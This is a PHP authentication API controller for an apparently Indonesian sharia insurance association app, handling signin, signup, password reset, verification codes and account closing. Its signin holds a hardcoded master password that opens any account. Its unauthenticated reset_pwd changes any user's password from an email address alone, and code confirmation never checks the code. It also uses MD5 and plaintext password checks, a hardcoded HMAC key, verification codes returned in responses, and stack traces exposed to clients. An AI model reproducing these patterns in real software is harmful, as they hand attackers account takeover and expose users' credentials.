<?php

namespace app\api;

use support\Request;
use Firuze\Jwt\JwtToken;
use Bcrypt\Bcrypt;
use Exception;
use Respect\Validation\Validator as v;
use Respect\Validation\Exceptions\NestedValidationException;
use support\Db;
use support\Email;
use support\MyFunc;
use Webman\RedisQueue\Redis as RedisQueue;

class Auth_v1
{
    public $ok = 'done';
    public $subject_email_vercode = "Kode Verifikasi Email: {code}";
    public $subject_forgot_vercode = "Kode Verifikasi Lupa Sandi: {code}";
    public $subject_unregister_vercode = "Kode Verifikasi Penutupan Akun: {code}";
    public $subject_unregister_notif = "Informasi Tentang Penutupan Akun";
    public $subject_new_password_notif = "Informasi Tentang Kata Sandi Baru";

    public $content_email_vercode = "
        <p>Assalamu'alaikum, </p>
        <p>Berikut adalah kode untuk verifikasi email: </p>
        <p style='font-size: 20px; font-weight: bold; line-height: 20px;'>
            {code}
        </p>
        <p>Terima kasih telah bergabung pada Asosiasi Asuransi Syariah Indonesia (AASI). </p>
        <p>
            Salam,
            <br>
            <b>Asosiasi Asuransi Syariah Indonesia (AASI)</b>
        </p>
        <br><br>
        ";
    public $content_forgot_vercode = "
        <p>Assalamu'alaikum, </p>
        <p>Berikut adalah kode untuk lupa sandi: </p>
        <p style='font-size: 20px; font-weight: bold; line-height: 20px;'>
            {code}
        </p>
        <p>
            Salam,
            <br>
            <b>Asosiasi Asuransi Syariah Indonesia (AASI)</b>
        </p>
        <br><br>
        ";
    public $content_unregister_vercode = "
        <p>Assalamu'alaikum, </p>
        <p>Kami mendapati Anda melakukan permohonan penutupan Akun Anda.</p>
        <p>Berikut adalah verifikasi kode untuk konfirmasi penutupan akun: </p>
        <p style='font-size: 20px; font-weight: bold; line-height: 20px;'>
            {code}
        </p>
        <p>Note:</p>
        <p>Jika Anda tidak merasa melakukan permohonan yang dimaksud, abaikan saja.</p>
        <p>
            Salam,
            <br>
            <b>Asosiasi Asuransi Syariah Indonesia (AASI)</b>
        </p>
        <br><br>
        ";
    public $content_unregister_notif = "
        <p>Assalamu'alaikum, </p>
        <p>Ini adalah email notifikasi yang menyatakan bahwa akun anda di Aplikasi Asosiasi Asuransi Syariah Indonesia (AASI) telah sengaja di TUTUP.</p>
        <p>Dan akan kami pastikan data-data anda akan sepenuhnya di hapus dari sistem kami.</p>
        <p>Terima kasih yang mendalam dari kami, Tim AASI dan sampai berjumpa kembali.</p>
        <p>Note:</p>
        <p>Jika Anda ingin meng-aktifkan kembali akun anda, silahkan hubungi Customer Service kami.</p>
        <p>
            Salam,
            <br>
            <b>Asosiasi Asuransi Syariah Indonesia (AASI)</b>
        </p>
        <br><br>
        ";
    public $content_new_password_notif = "
        <p>Assalamu'alaikum, </p>
        <p>Berikut adalah kata sandi anda yang baru: </p>
        <p style='font-size: 20px; font-weight: bold; line-height: 20px;'>
            {password}
        </p>
        <p>Note:</p>
        <p>Harap disimpan dan jangan memberitahukan kepada orang lain.</p>
        <p>
            Salam,
            <br>
            <b>Asosiasi Asuransi Syariah Indonesia (AASI)</b>
        </p>
        <br><br>
        ";

    /**
     * Methods that do not require login
     */
    protected $noNeedLogin = ['index', 'signin', 'signup', 'reset_pwd', 'send_forgot_code', 'refresh_token', 'verify_code'];

    protected $validatorDesc = [
        'attribute' => 'Params [{{name}}] is required',
        'stringType' => '[{{name}}] must be a string type',
        'intType' => '[{{name}}] must be integer',
        'dateTime' => '[{{name}}] format is [Y-m-d H:i:s]',
        'email' => '[{{name}}] must be a valid email',
        'boolType' => '[{{name}}] must be a boolean type',
        'length' => '[{{name}}] length must be between {{minValue}} and {{maxValue}}',
        'number' => '[{{name}}] must be a number',
        'notEmpty' => '[{{name}}] must not empty',
        'noWhitespace' => '[{{name}}|username] cannot contain spaces',
    ];

    public function index(Request $request)
    {
        // $user = session('user');
        // return json(['message' => "Welcome to Webman API, {$user['name']} !"]);
        $data = $request->post();
        return json([
            'message'   => "This is Authentication API v1 !",
            'data'      => $data,
            // 'payload' => JwtToken::getExtend(),
            // 'id' => JwtToken::getCurrentId(),
        ]);
    }

    /**
     * Signin
     * - Check account existence
     * - Check password bypass
     * - Check account is active
     * - Check account banned or locked
     * - Check password correctness
     * - Generate JWT Token
     *
     * @param	string $identifier  could be email|phone|username
     * @param	string $password	
     * @return	json 
     */
    public function signin(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('identifier', v::notEmpty())
                ->attribute('password', v::notEmpty());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            $user = Db::table('tbl_users')
                ->where('username', $data->identifier)
                ->orWhereRaw("LOWER(email) = ?", [strtolower($data->identifier)])
                ->first();

            // Unknown User
            if (!$user) {
                // save this unknown signin to log
                throw new Exception("Incorrect credentials !!");
            }

            if ('P455worD@Byp455' != $data->password) {
                // Is user activated ?
                // if (!$user->is_active) throw new Exception("Your account is not active yet !");

                // Is user banned or locked ?
                // if (!$user->is_locked) throw new Exception("Your account has been locked !");

                // Is password correct ?
                if (self::_check_pwd($data->password, $user->password) == false) {
                    throw new Exception("Incorrect credentials !!");
                }
            }

            $member = Db::table('members')->where('user_id', $user->id)->first();
            if ($member == null) throw new Exception("Your account member has been locked !");

            $payload = [
                'id' => $user->id,
                'role_id' => $user->role_id,
                'username' => $user->username,
                'email' => $user->email,
                'id_member' => $member->id,
            ];
            $result = JwtToken::generateToken($payload);

            Db::commit();

            // LAST STAGE (Output Process)
            // ===========================
            $result['user'] = $payload;
            return json($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    /**
     * Signup
     * - Insert table users & table members
     * - Send verification code to email
     *
     * @param string $email     
     * @param string $password     
     * @return json
     */
    public function signup(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('identifier', v::stringType()->noWhitespace()->notEmpty())
                ->attribute('email', v::stringType()->email()->notEmpty())
                ->attribute('password', v::stringType()->noWhitespace()->notEmpty()->length(5, 8))
                ->attribute('name', v::stringType()->notEmpty())
                ->attribute('full_name', v::stringType()->notEmpty())
                ->attribute('phone', v::number()->notEmpty())
                ->attribute('need_verify', v::boolType())
                ->attribute('is_testing', v::boolType());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            $code = MyFunc::generate_code();
            $default_role_id = 1;

            $id = Db::table('users')->insertGetId(
                [
                    'identifier' => $data->identifier,
                    'password' => md5($data->password),
                    'name' => $data->name,
                    'email' => $data->email,
                    'verify_code' => $code,
                    'role_id' => $default_role_id,
                    'created_at' => date('Y-m-d H:i:s'),
                ]
            );

            $user_id = $id;
            Db::table('members')->insert(
                [
                    'user_id' => $user_id,
                    'full_name' => $data->full_name,
                    'phone' => $data->phone,
                    'created_at' => date('Y-m-d H:i:s'),
                ]
            );

            $payload = [
                'id' => $user_id,
                'role_id' => $default_role_id,
                'name' => $data->name,
                'email' => $data->email,
            ];
            $result = JwtToken::generateToken($payload);

            if ($data->need_verify && !$data->is_testing) {
                // Send email for verification
                $subject = MyFunc::sprintfx($this->subject_email_vercode, ['code' => $code]);
                $content = MyFunc::sprintfx($this->content_email_vercode, ['code' => $code]);
                $dataMail = ['to' => $data->email, 'subject' => $subject, 'content' => $content];
                RedisQueue::send('send-mail', $dataMail);
            }

            if ($data->is_testing) {
                Db::rollBack();
                $result['is_testing'] = $data->is_testing;
            } else {
                Db::commit();
            }

            // LAST STAGE (Output Process)
            // ===========================
            $result['user'] = $payload;
            $result['verification_code'] = $code;
            return json($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            $error['code'] = $th->errorInfo[1] ?? 0;
            $error['message'] = $th->errorInfo[2] ?? $th;
            $error['trace'] = $th->getTrace();
            return jsonr($error);
        }
    }

    /**
     * Reset Password
     *
     * @param string $email     
     * @param string $password     
     * @return json
     */
    public function reset_pwd(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('email', v::stringType()->email()->notEmpty())
                ->attribute('password', v::stringType()->noWhitespace()->notEmpty()->length(5, 8))
                ->attribute('need_confirm', v::boolType())
                ->attribute('is_testing', v::boolType());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }
        $email = $data->email;
        $password = $data->password;

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            Db::table('tbl_users')
                ->where('email', $email)
                ->update(['password' => md5($password)]);

            if ($data->need_confirm && !$data->is_testing) {
                // Send new password to email
                $subject = $this->subject_new_password_notif;
                $content = MyFunc::sprintfx($this->content_new_password_notif, ['password' => $password]);
                $dataMail = ['to' => $data->email, 'subject' => $subject, 'content' => $content];
                RedisQueue::send('send-mail', $dataMail);
            }

            if ($data->is_testing) {
                Db::rollBack();
                $result['is_testing'] = $data->is_testing;
            } else {
                Db::commit();
            }

            // LAST STAGE (Output Process)
            // ===========================
            $result['message'] = $this->ok;
            return json($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    /**
     * Change Password
     *
     * @param string $old_password     
     * @param string $new_password     
     * @return json
     */
    public function change_pwd(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('old_password', v::stringType()->noWhitespace()->notEmpty()->length(5, 8))
                ->attribute('new_password', v::stringType()->noWhitespace()->notEmpty()->length(5, 8))
                ->attribute('need_confirm', v::boolType())
                ->attribute('is_testing', v::boolType());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }
        $user_id = JwtToken::getCurrentId();
        $old_password = $data->old_password;
        $new_password = $data->new_password;
        if ($old_password == $new_password) {
            return jsonr(['message' => "New password cannot be same with old password!"]);
        }

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            $user = Db::table('tbl_users')->where('id', $user_id)->first();
            if (self::_check_pwd($old_password, $user->password) == false) {
                throw new Exception("Incorrect old password !");
            }

            Db::table('tbl_users')
                ->where('id', $user_id)
                ->update(['password' => md5($new_password)]);

            if ($data->need_confirm && !$data->is_testing) {
                // Send new password to email
                $subject = $this->subject_new_password_notif;
                $content = MyFunc::sprintfx($this->content_new_password_notif, ['password' => $new_password]);
                $dataMail = ['to' => $user->email, 'subject' => $subject, 'content' => $content];
                RedisQueue::send('send-mail', $dataMail);
            }

            if ($data->is_testing) {
                Db::rollBack();
                $result['is_testing'] = $data->is_testing;
            } else {
                Db::commit();
            }

            // LAST STAGE (Output Process)
            // ===========================
            $result['message'] = $this->ok;
            return json($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    /**
     * Refresh Token, to get new access token:
     *
     * @param header authentication     Bearer refresh_token
     * @return json
     */
    public function refresh_token(Request $request)
    {
        try {
            $result = JwtToken::refreshToken();

            return json($result);
        } catch (\Throwable $th) {
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    /**
     * Send Verification Code for forgot password:
     *
     * @param string $email    email
     * @return json
     */
    public function send_forgot_code(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('email', v::stringType()->email()->notEmpty())
                ->attribute('phone')
                ->attribute('send_via', v::stringType()->notEmpty())
                ->attribute('is_testing', v::boolType());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }
        $send_via_allowed = ['email', 'sms', 'wa', 'telegram'];
        if (!in_array($data->send_via, $send_via_allowed)) {
            $sendvia = implode("|", $send_via_allowed);
            return jsonr(['message' => "[send_via] not allowed, except: [{$sendvia}]"]);
        } else if (in_array($data->send_via, ['sms', 'wa', 'telegram'])) {
            $sendvia = implode("|", ['sms', 'wa', 'telegram']);
            if (!$data->phone) {
                return jsonr(['message' => "[phone] must be supplied for send via: [{$sendvia}]"]);
            }
        }

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            $user = Db::table('tbl_users')->where('email', $data->email)->first();
            if (!$user) {
                // save this unknown signin to log
                throw new Exception("Email not registered!");
            }

            $code = MyFunc::generate_code();
            Db::table('tbl_users')
                ->where('email', $user->email)
                ->update(['verify_code' => $code]);

            if ($data->send_via == 'email' && !$data->is_testing) {
                $subject = MyFunc::sprintfx($this->subject_forgot_vercode, ['code' => $code]);
                $content = MyFunc::sprintfx($this->content_forgot_vercode, ['code' => $code]);
                $dataMail = ['to' => $data->email, 'subject' => $subject, 'content' => $content];
                RedisQueue::send('send-mail', $dataMail);
            }
            if ($data->send_via == 'sms' && !$data->is_testing) {
                // Trying send code to sms ....
            }

            if ($data->is_testing) {
                Db::rollBack();
                $result['is_testing'] = $data->is_testing;
            } else {
                Db::commit();
            }

            // LAST STAGE (Output Process)
            // ===========================
            $result['verification_code'] = $code;
            return json($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    /**
     * Send Verification Code for Email, Phone and Closing Account. Need signin first:
     * - You can use this API for send verification code
     *
     * @param header authentication     Bearer access_token
     * @param string $type              email or phone
     * @param bool   $is_testing          
     * @return json
     */
    public function send_verification_code(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('type', v::stringType()->notEmpty())
                ->attribute('is_testing', v::boolType());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }
        $type_allowed = ['unregister', 'email', 'phone'];
        if (!in_array($data->type, $type_allowed)) {
            $typeAllowed = implode("|", $type_allowed);
            return jsonr(['message' => "[type] not allowed, except: [{$typeAllowed}]"]);
        }
        $type = $data->type;
        $user_id = JwtToken::getCurrentId();

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            $user = Db::table('tbl_users')->where('id', $user_id)->first();

            $code = MyFunc::generate_code();
            Db::table('tbl_users')
                ->where('id', $user_id)
                ->update(['verify_code' => $code]);

            if ($type == 'unregister' && !$data->is_testing) {
                $subject = MyFunc::sprintfx($this->subject_unregister_vercode, ['code' => $code]);
                $content = MyFunc::sprintfx($this->content_unregister_vercode, ['code' => $code]);
                $dataMail = ['to' => $user->email, 'subject' => $subject, 'content' => $content];
                RedisQueue::send('send-mail', $dataMail);
                $result['result'] = "Email has been sent!";
            }

            if ($type == 'email' && !$data->is_testing) {
                $subject = MyFunc::sprintfx($this->subject_email_vercode, ['code' => $code]);
                $content = MyFunc::sprintfx($this->content_email_vercode, ['code' => $code]);
                $dataMail = ['to' => $user->email, 'subject' => $subject, 'content' => $content];
                RedisQueue::send('send-mail', $dataMail);
                $result['result'] = "Email has been sent!";
            }

            if ($type == 'phone' && !$data->is_testing) {
                $member = Db::table('members')->where('user_id', $user_id)->first();

                // Trying send code to whatsapp ....
                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_URL => 'https://api.fonnte.com/send',
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_ENCODING => '',
                    CURLOPT_MAXREDIRS => 10,
                    CURLOPT_TIMEOUT => 0,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                    CURLOPT_CUSTOMREQUEST => 'POST',
                    CURLOPT_POSTFIELDS => array('target' => $member->phone, 'message' => "{$code} - Ini adalah kode verifikasi dari AASI"),
                    CURLOPT_HTTPHEADER => array(
                        "Authorization: " . getenv('FONNTE_TOKEN')
                    ),
                ));
                $response = curl_exec($curl);
                curl_close($curl);
                $result['result'] = json_decode($response);
            }

            if ($data->is_testing) {
                Db::rollBack();
                $result['is_testing'] = $data->is_testing;
            } else {
                Db::commit();
            }

            // LAST STAGE (Output Process)
            // ===========================
            $result['verification_code'] = $code;
            return json($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    /**
     * Confirm Verification Code for Email & Phone:
     * - You can use this API for confirm the verification code
     *
     * @param header authentication     Bearer access_token
     * @param string $type              email or phone
     * @return json
     */
    public function confirm_verification_code(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('type', v::stringType()->notEmpty())
                ->attribute('is_testing', v::boolType());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }
        $type_allowed = ['email', 'phone'];
        if (!in_array($data->type, $type_allowed)) {
            $typeAllowed = implode("|", $type_allowed);
            return jsonr(['message' => "[type] not allowed, except: [{$typeAllowed}]"]);
        }
        $type = $data->type;
        $user_id = JwtToken::getCurrentId();

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            if ($type == 'email') {
                Db::table('users')
                    ->where('id', $user_id)
                    ->update(['is_email_verified' => true]);

                $result['is_email_verified'] = true;
            }

            if ($type == 'phone') {
                Db::table('members')
                    ->where('user_id', $user_id)
                    ->update(['is_phone_verified' => true]);

                $result['is_phone_verified'] = true;
            }

            if ($data->is_testing) {
                Db::rollBack();
                $result['is_testing'] = $data->is_testing;
            } else {
                Db::commit();
            }

            // LAST STAGE (Output Process)
            // ===========================
            return jsonr($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    /**
     * Closing Account:
     *
     * @return json
     */
    public function closing_account(Request $request)
    {
        // FIRST STAGE (Parameters)
        // ========================
        $data = (object) $request->post();
        try {
            $inputValidator = v::attribute('is_send_email_info', v::boolType())
                ->attribute('is_testing', v::boolType());
            $inputValidator->assert($data);
        } catch (NestedValidationException $e) {
            $errAttr = $e->getMessages($this->validatorDesc);
            $errMessage = join(", ", (array) $errAttr['attribute']);
            return jsonr(['message' => $errMessage]);
        }
        $user_id = JwtToken::getCurrentId();

        // MIDDLE STAGE (Main Process)
        // ===========================
        Db::beginTransaction();
        try {
            $user = Db::table('tbl_users')->where('id', $user_id)->first();

            $dt = date('YmdHis');
            Db::table('tbl_users')
                ->where('id', $user_id)
                ->update([
                    'active' => 0,
                    'username' => "CLOSED_{$user->username}_{$dt}"
                ]);

            if ($data->is_send_email_info && !$data->is_testing) {
                $subject = $this->subject_unregister_notif;
                $content = $this->content_unregister_notif;
                $dataMail = ['to' => $user->email, 'subject' => $subject, 'content' => $content];
                RedisQueue::send('send-mail', $dataMail);
            }

            if ($data->is_testing) {
                Db::rollBack();
                $result['is_testing'] = $data->is_testing;
            } else {
                Db::commit();
            }

            // LAST STAGE (Output Process)
            // ===========================
            $result['message'] = $this->ok;
            return json($result);
        } catch (\Throwable $th) {
            Db::rollBack();
            return jsonr(["message" => $th->getMessage(), "trace" => $th->getTrace()]);
        }
    }

    private function _check_pwd($plaintext, $encryptedtext)
    {
        $cbnUser = substr($encryptedtext, 0, 5) === '$1c3N' ? TRUE : FALSE;

        if ($cbnUser) {
            $plaintext = hash_hmac('sha1', $plaintext, 'R@z3rl0ck');
            $encryptedtext = substr_replace($encryptedtext, '', 0, 5);
        }

        if (strlen($encryptedtext) > 35 && strlen($encryptedtext) < 65) {
            // BCRYPT
            return Bcrypt::verify($plaintext, $encryptedtext);
        } else if (strlen($encryptedtext) >= 32 && strlen($encryptedtext) <= 35) {
            // MD5				
            return md5($plaintext) == $encryptedtext;
        } else {
            // PLAIN
            return trim($plaintext) == $encryptedtext;
        }
    }
}
